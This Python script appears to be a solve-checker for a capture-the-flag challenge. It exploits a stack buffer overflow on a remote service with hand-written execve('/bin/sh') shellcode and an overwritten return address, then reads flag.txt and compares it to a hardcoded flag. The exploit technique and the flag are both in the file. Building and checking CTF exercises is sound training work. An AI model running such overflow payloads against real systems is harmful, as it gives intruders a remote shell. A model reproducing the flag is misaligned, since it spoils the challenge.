import struct
import socket
import telnetlib

# Utility functions
def make_conn(host,port):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((host,port))
    return sock

def recvuntil(sock, delim):
    data = "".encode()
    if isinstance(delim, (str)):
        delim = delim.encode()
    while not data.endswith(delim):
        data += sock.recv(1)
    return data

def p32(data):
    return struct.pack('<I', data)

def send(sock, data):
    sock.send(data)
    return 1

def sendline(sock, data):
    if isinstance(data, (str)):
        data = data.encode() + '\n'.encode()
    sock.send(data)
    return 1

# Connection to the chall
conn = make_conn('webctf.it', 6001)

# Wait for the name question
recvuntil(conn, "What is your name?\n")

# Manual shellcode
payload  = b'\xb8\x0b\x00\x00\x00'         # asm("mov eax,11")               # EAX = 11
payload += b'\xbb\x90\xa0\x04\x08'         # asm("mov ebx,0x804a090")        # EBX = 0x804a090 = address of "/bin/sh"
payload += b'1\xc91\xd2'                   # asm("xor ecx,ecx; xor edx,edx") # ECX = EDX = 0
payload += b'\xcd\x80'                     # asm("int 0x80")                 # INT 80H
payload += "/bin/sh\x00".encode()

# Padding (with spaces) to reach the return address
payload = payload.ljust(1012)

# Overwrite the return address with the shellcode address
payload += p32(0x804a080)

# Padding (with spaces) to finish the read() which is of 4096 bytes
payload = payload.ljust(4096)

# Send the payload
send(conn, payload)

# Test the flag
sendline(conn, "cat flag.txt")
sendline(conn, "cat flag.txt; echo DELIMITER")

if "flag{4ss3mbly_1s_n0t_a_sh1t!!}".encode() in recvuntil(conn, "DELIMITER"):
    #print("TRUE")
    exit(0)

#print("FALSE")
exit(1)
